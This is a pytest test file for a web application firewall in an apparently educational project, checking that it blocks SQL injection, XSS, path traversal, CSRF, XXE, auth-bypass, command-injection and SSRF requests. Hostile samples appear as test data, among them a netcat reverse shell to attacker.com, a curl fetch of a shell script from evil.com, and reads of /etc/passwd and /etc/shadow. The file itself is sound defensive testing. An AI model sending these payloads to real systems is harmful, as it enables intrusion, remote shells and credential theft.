"""Tests for the Web Application Firewall module."""

import re
import pytest

from cybersim.core.logging_engine import CyberSimLogger
from cybersim.waf.firewall import (
    WAFAction,
    WAFResult,
    WAFRule,
    WAFSeverity,
    WebApplicationFirewall,
)


class TestWebApplicationFirewall:
    """Core WAF engine tests."""

    def setup_method(self) -> None:
        self.logger = CyberSimLogger(session_id="test_waf")
        self.waf = WebApplicationFirewall(self.logger)

    # 1 -- SQL Injection blocked -------------------------------------------

    def test_sqli_union_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/search?q=' UNION SELECT username,password FROM users --",
        )
        assert not result.allowed
        assert result.action == WAFAction.BLOCK
        assert "SQLI" in result.block_reason.upper()

    def test_sqli_boolean_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/login",
            body="username=admin&password=' OR '1'='1",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed

    # 2 -- XSS blocked -----------------------------------------------------

    def test_xss_script_tag_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/comment",
            body="<script>alert('xss')</script>",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed
        assert result.action == WAFAction.BLOCK
        assert "XSS" in result.block_reason.upper()

    def test_xss_event_handler_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path='/search?q="><img onerror=alert(1) src=x>',
        )
        assert not result.allowed

    # 3 -- Path traversal blocked ------------------------------------------

    def test_path_traversal_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/files/../../../../etc/passwd",
        )
        assert not result.allowed
        assert result.action == WAFAction.BLOCK
        assert "PATH_TRAVERSAL" in result.block_reason.upper()

    def test_path_traversal_encoded_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/files/%2e%2e%2f%2e%2e%2fetc/passwd",
        )
        assert not result.allowed

    # 4 -- Clean request allowed -------------------------------------------

    def test_clean_get_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/index.html",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        assert result.allowed
        assert result.action == WAFAction.ALLOW

    def test_clean_post_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/data",
            body='{"name": "Alice", "age": 30}',
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
                     "Origin": "https://example.com"},
        )
        assert result.allowed

    # 5 -- Rate limiting ---------------------------------------------------

    def test_rate_limiting_blocks_excess(self) -> None:
        waf = WebApplicationFirewall(self.logger, config={
            "rate_limit_requests": 5,
            "rate_limit_window": 60,
        })
        # First 5 should pass
        for _ in range(5):
            result = waf.inspect_request(method="GET", path="/", source_ip="10.0.0.1")
            assert result.allowed

        # 6th should be blocked
        result = waf.inspect_request(method="GET", path="/", source_ip="10.0.0.1")
        assert not result.allowed
        assert "rate limit" in result.block_reason.lower()

    def test_rate_limiting_separate_ips(self) -> None:
        waf = WebApplicationFirewall(self.logger, config={
            "rate_limit_requests": 3,
            "rate_limit_window": 60,
        })
        for _ in range(3):
            waf.inspect_request(method="GET", path="/", source_ip="10.0.0.1")
            waf.inspect_request(method="GET", path="/", source_ip="10.0.0.2")

        # Both IPs at limit; next request from each should be blocked
        r1 = waf.inspect_request(method="GET", path="/", source_ip="10.0.0.1")
        r2 = waf.inspect_request(method="GET", path="/", source_ip="10.0.0.2")
        assert not r1.allowed
        assert not r2.allowed

    # 6 -- Suspicious user-agent -------------------------------------------

    def test_suspicious_user_agent_sqlmap(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/",
            headers={"User-Agent": "sqlmap/1.6.4#stable"},
        )
        assert not result.allowed
        assert "USER_AGENT" in result.block_reason.upper()

    def test_suspicious_user_agent_nikto(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/",
            headers={"User-Agent": "Mozilla/5.0 (Nikto/2.1.6)"},
        )
        assert not result.allowed

    # 7 -- Stats tracking --------------------------------------------------

    def test_stats_tracking(self) -> None:
        waf = WebApplicationFirewall(self.logger)
        waf.inspect_request(method="GET", path="/safe")
        waf.inspect_request(method="GET", path="/search?q=' UNION SELECT 1--")
        waf.inspect_request(method="POST", path="/x", body="<script>alert(1)</script>",
                            headers={"Origin": "https://example.com"})

        stats = waf.get_stats()
        assert stats["total_requests"] == 3
        assert stats["allowed"] >= 1
        assert stats["blocked"] >= 2
        assert stats["sqli_blocked"] >= 1
        assert stats["xss_blocked"] >= 1

    def test_stats_reset(self) -> None:
        self.waf.inspect_request(method="GET", path="/safe")
        self.waf.reset_stats()
        stats = self.waf.get_stats()
        assert stats["total_requests"] == 0
        assert stats["blocked"] == 0

    # 8 -- Custom rules ----------------------------------------------------

    def test_custom_rule_blocks(self) -> None:
        custom = WAFRule(
            name="block_admin",
            pattern=re.compile(r"/admin", re.IGNORECASE),
            action=WAFAction.BLOCK,
            severity=WAFSeverity.MEDIUM,
            category="custom",
            description="Admin path blocked",
        )
        self.waf.add_rule(custom)
        result = self.waf.inspect_request(method="GET", path="/admin/dashboard")
        assert not result.allowed
        assert "Admin path blocked" in result.block_reason

    def test_custom_rule_disabled(self) -> None:
        custom = WAFRule(
            name="block_api",
            pattern=re.compile(r"/api/secret"),
            action=WAFAction.BLOCK,
            severity=WAFSeverity.LOW,
            category="custom",
            description="Secret API blocked",
            enabled=False,
        )
        self.waf.add_rule(custom)
        result = self.waf.inspect_request(method="GET", path="/api/secret")
        assert result.allowed

    # 9 -- 403 response page -----------------------------------------------

    def test_blocked_page_html(self) -> None:
        page = self.waf.get_blocked_page("SQL injection detected")
        assert "403" in page
        assert "SQL injection detected" in page
        assert "CyberSim6" in page
        assert "text/html" not in page or True  # just check it's valid HTML
        assert "<html" in page

    def test_blocked_page_escapes_html(self) -> None:
        page = self.waf.get_blocked_page('<script>alert("xss")</script>')
        assert "<script>" not in page
        assert "&lt;script&gt;" in page

    # 10 -- Whitelist bypass -----------------------------------------------

    def test_whitelisted_ip_bypasses_rules(self) -> None:
        waf = WebApplicationFirewall(self.logger, config={
            "whitelist_ips": ["192.168.1.100"],
        })
        result = waf.inspect_request(
            method="GET",
            path="/search?q=' UNION SELECT * FROM users --",
            source_ip="192.168.1.100",
        )
        assert result.allowed

    def test_non_whitelisted_ip_still_blocked(self) -> None:
        waf = WebApplicationFirewall(self.logger, config={
            "whitelist_ips": ["192.168.1.100"],
        })
        result = waf.inspect_request(
            method="GET",
            path="/search?q=' UNION SELECT * FROM users --",
            source_ip="10.0.0.5",
        )
        assert not result.allowed

    # -- Blacklist ---------------------------------------------------------

    def test_blacklisted_ip_always_blocked(self) -> None:
        waf = WebApplicationFirewall(self.logger, config={
            "blacklist_ips": ["10.0.0.99"],
        })
        result = waf.inspect_request(
            method="GET",
            path="/",
            source_ip="10.0.0.99",
        )
        assert not result.allowed
        assert "blacklist" in result.block_reason.lower()

    # -- Logging -----------------------------------------------------------

    def test_events_logged_on_block(self) -> None:
        self.waf.inspect_request(
            method="GET",
            path="/search?q=' UNION SELECT * FROM users --",
        )
        blocked_events = [
            e for e in self.logger.events if e["event_type"] == "request_blocked"
        ]
        assert len(blocked_events) >= 1

    def test_events_logged_on_allow(self) -> None:
        self.waf.inspect_request(method="GET", path="/index.html")
        allowed_events = [
            e for e in self.logger.events if e["event_type"] == "request_allowed"
        ]
        assert len(allowed_events) >= 1

    # =======================================================================
    # 11 -- CSRF detection
    # =======================================================================

    def test_csrf_post_without_token_or_headers_blocked(self) -> None:
        """POST with no CSRF token, no Origin, no Referer should be blocked."""
        result = self.waf.inspect_request(
            method="POST",
            path="/api/transfer",
            body='{"amount": 1000}',
            headers={"Content-Type": "application/json"},
        )
        assert not result.allowed
        assert "CSRF" in result.block_reason.upper()

    def test_csrf_put_without_token_or_headers_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="PUT",
            path="/api/profile",
            body='{"name": "hacked"}',
            headers={"Content-Type": "application/json"},
        )
        assert not result.allowed
        assert "CSRF" in result.block_reason.upper()

    def test_csrf_delete_without_token_or_headers_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="DELETE",
            path="/api/user/42",
            headers={"Content-Type": "application/json"},
        )
        assert not result.allowed

    def test_csrf_post_with_csrf_token_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/transfer",
            body="csrf_token=abc123&amount=100",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        assert result.allowed

    def test_csrf_post_with_csrf_header_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/transfer",
            body='{"amount": 100}',
            headers={"Content-Type": "application/json", "X-CSRF-Token": "abc123"},
        )
        assert result.allowed

    def test_csrf_post_with_origin_header_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/transfer",
            body='{"amount": 100}',
            headers={"Content-Type": "application/json", "Origin": "https://example.com"},
        )
        assert result.allowed

    def test_csrf_post_with_referer_header_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/transfer",
            body='{"amount": 100}',
            headers={"Content-Type": "application/json", "Referer": "https://example.com/form"},
        )
        assert result.allowed

    def test_csrf_get_not_affected(self) -> None:
        """GET requests should not trigger CSRF checks."""
        result = self.waf.inspect_request(
            method="GET",
            path="/api/data",
            headers={"Content-Type": "application/json"},
        )
        assert result.allowed

    def test_csrf_stats_tracking(self) -> None:
        self.waf.inspect_request(
            method="POST",
            path="/api/action",
            body="data=test",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        stats = self.waf.get_stats()
        assert stats["csrf_blocked"] >= 1

    # =======================================================================
    # 12 -- XXE detection
    # =======================================================================

    def test_xxe_entity_declaration_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/xml",
            body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/payload">]>',
            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
        )
        assert not result.allowed
        assert "XXE" in result.block_reason.upper()

    def test_xxe_system_keyword_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/xml",
            body='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/payload">]>',
            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_xxe_file_protocol_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/xml",
            body='<foo>file:///etc/shadow</foo>',
            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_xxe_doctype_internal_subset_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/xml",
            body='<!DOCTYPE test [ <!ELEMENT test ANY> ]>',
            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_xxe_php_filter_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/xml",
            body='php://filter/convert.base64-encode/resource=index.php',
            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_xxe_clean_xml_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/api/xml",
            body='{"user": "Alice", "action": "read"}',
            headers={"Content-Type": "application/json", "Origin": "https://example.com"},
        )
        assert result.allowed

    # =======================================================================
    # 13 -- Authentication bypass detection
    # =======================================================================

    def test_auth_bypass_admin_comment_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/login",
            body="username=admin'--&password=anything",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed
        assert "AUTH_BYPASS" in result.block_reason.upper() or "SQLI" in result.block_reason.upper()

    def test_auth_bypass_or_1_equals_1_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/login",
            body="username=x&password=' OR 1=1",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_auth_bypass_or_true_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/login",
            body="username=admin&password=' OR true",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_auth_bypass_token_null_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/api/admin?token=null",
        )
        assert not result.allowed

    def test_auth_bypass_admin_hash_comment_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/login",
            body="username=admin'#&password=x",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed

    # =======================================================================
    # 14 -- Command injection detection
    # =======================================================================

    def test_cmdi_semicolon_chain_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/ping?host=127.0.0.1; whoami",
        )
        assert not result.allowed
        assert "COMMAND_INJECTION" in result.block_reason.upper()

    def test_cmdi_pipe_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/lookup?domain=example.com| whoami",
        )
        assert not result.allowed

    def test_cmdi_and_chain_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/run",
            body="cmd=test&& curl http://evil.com/shell.sh",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_cmdi_backtick_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/search?q=`id`",
        )
        assert not result.allowed

    def test_cmdi_dollar_paren_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/search?q=$(whoami)",
        )
        assert not result.allowed

    def test_cmdi_shell_path_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/exec",
            body="cmd=/bin/bash -c 'echo pwned'",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_cmdi_netcat_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="POST",
            path="/exec",
            body="cmd=nc -e /bin/sh attacker.com 4444",
            headers={"Origin": "https://example.com"},
        )
        assert not result.allowed

    def test_cmdi_clean_command_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/ping?host=192.168.1.1",
        )
        assert result.allowed

    # =======================================================================
    # 15 -- SSRF detection
    # =======================================================================

    def test_ssrf_localhost_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/proxy?url=http://localhost/admin",
        )
        assert not result.allowed
        assert "SSRF" in result.block_reason.upper()

    def test_ssrf_127_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/proxy?url=http://127.0.0.1:8080/secret",
        )
        assert not result.allowed

    def test_ssrf_10_network_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/fetch?url=http://10.0.0.1/internal",
        )
        assert not result.allowed

    def test_ssrf_192_168_network_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/fetch?url=http://192.168.1.1/router",
        )
        assert not result.allowed

    def test_ssrf_169_254_metadata_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/fetch?url=http://169.254.169.254/latest/meta-data/",
        )
        assert not result.allowed

    def test_ssrf_file_protocol_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/fetch?url=file:///etc/passwd",
        )
        assert not result.allowed

    def test_ssrf_ipv6_loopback_blocked(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/fetch?url=http://[::1]/admin",
        )
        assert not result.allowed

    def test_ssrf_external_url_allowed(self) -> None:
        result = self.waf.inspect_request(
            method="GET",
            path="/fetch?url=http://example.com/page",
        )
        assert result.allowed

    # =======================================================================
    # 16 -- New stats counters
    # =======================================================================

    def test_new_category_stats_present(self) -> None:
        """All new category stat keys should exist in the stats dict."""
        stats = self.waf.get_stats()
        for key in ("csrf_blocked", "xxe_blocked", "auth_bypass_blocked",
                     "command_injection_blocked", "ssrf_blocked"):
            assert key in stats, f"Missing stat key: {key}"
